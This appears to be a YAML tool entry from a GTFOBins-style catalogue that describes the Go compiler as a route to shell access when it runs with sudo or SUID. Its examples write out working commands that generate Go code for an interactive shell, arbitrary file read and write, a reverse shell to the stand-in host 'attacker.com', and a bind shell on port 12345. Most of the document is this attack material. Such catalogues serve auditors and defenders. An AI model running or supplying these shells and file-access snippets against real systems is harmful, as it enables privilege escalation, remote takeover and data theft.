---
id: build-compiler-go
namespace: build:compiler:go
name: go
description: Go programming language compiler and toolchain that can execute arbitrary Go code.
author: "Repository Maintainers"
version: "1.0.0"
capabilities:
  - security.execution.command
  - security.privilege-escalation.shell
  - security.execution.reverse-shell
  - security.execution.bind-shell
  - system.file.read
  - system.file.write
  - build.compile.go
platforms:
  - linux
  - macos
  - windows
  - cross-platform
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
  - amd64
  - arm64
dependencies: []
related_tools:
  - gcc
  - rustc
artifacts:
  - type: build.compiled.binary
    description: Go compiled binary
    mime: application/x-executable
    trust_level: community
workflow_edges:
  produces:
    - compiled-binary
    - shell-access
    - file-content
    - reverse-shell
    - bind-shell
  consumes:
    - source-file
contract:
  inputs:
    - type: system.file.path
      description: Path to Go source file
  outputs:
    - type: process.output
      description: Output from Go program execution
  side_effects:
    - process_spawn
  resource_cost:
    cpu: high
    memory_mb: 64
    network: low
    disk_io: medium
resource_profile:
  cpu: high
  memory_mb: 64
  network: low
  disk_io: medium
allowed-tools:
  - go
  - Bash
  - execFile
parameters:
  - name: run
    type: file
    required: false
    description: "Compile and run Go program"
    aliases:
      - run
features:
  - process-manip
  - network-intensive
execution:
  template: "go {run}"
  sandbox: execFile
  timeout_seconds: 60
  shell: false
global_vars: {}
examples:
  - description: Spawn an interactive shell via Go code execution
    command: |-
      echo -e 'package main\nimport "syscall"\nfunc main(){\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, []string{})\n}' >/path/to/temp-file.go
      go run /path/to/temp-file.go
  - description: Read arbitrary file via Go code
    command: |-
      echo -e 'package main\nimport (\n\t"fmt"\n\t"os"\n)\n\nfunc main(){\n\tb, _ := os.ReadFile("/path/to/input-file")\n\tfmt.Print(string(b))\n}' >/path/to/temp-file.go
      go run /path/to/temp-file.go
  - description: Write arbitrary data to file via Go code
    command: |-
      echo -e 'package main\nimport "os"\nfunc main(){\n\tf, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)\n\tf.Write([]byte("DATA\\n"))\n\tf.Close()\n}' >/path/to/temp-file.go
      go run /path/to/temp-file.go
  - description: Spawn reverse shell via Go code
    command: |-
      echo -e 'package main\nimport (\n\t"os"\n\t"net"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\tip := net.ParseIP("attacker.com").To4()\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], ip)\n\tsyscall.Connect(fd, addr)\n\tsyscall.Dup2(fd, 0)\n\tsyscall.Dup2(fd, 1)\n\tsyscall.Dup2(fd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
      go run /path/to/temp-file.go
  - description: Spawn bind shell via Go code
    command: |-
      echo -e 'package main\nimport (\n\t"os"\n\t"syscall"\n)\n\nfunc main(){\n\tfd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)\n\taddr := &syscall.SockaddrInet4{Port: 12345}\n\tcopy(addr.Addr[:], []byte{0,0,0,0})\n\tsyscall.Bind(fd, addr)\n\tsyscall.Listen(fd, 1)\n\tnfd, _, _ := syscall.Accept(fd)\n\tsyscall.Dup2(nfd, 0)\n\tsyscall.Dup2(nfd, 1)\n\tsyscall.Dup2(nfd, 2)\n\tsyscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())\n}' >/path/to/temp-file.go
      go run /path/to/temp-file.go
references:
  - label: "Go documentation"
    url: "https://go.dev/doc/"
techniques:
  - privilege-escalation
  - execution
  - collection
install:
    - method: apt
      package_name: "golang-go"
      commands:
        - "apt-get install -y golang-go"
---


# go — Go Compiler Toolchain

The Go toolchain compiles and runs Go programs. With sudo or SUID, it can execute arbitrary Go code for shell access, file read/write, reverse shells, and bind shells — all via generated temp Go source files.
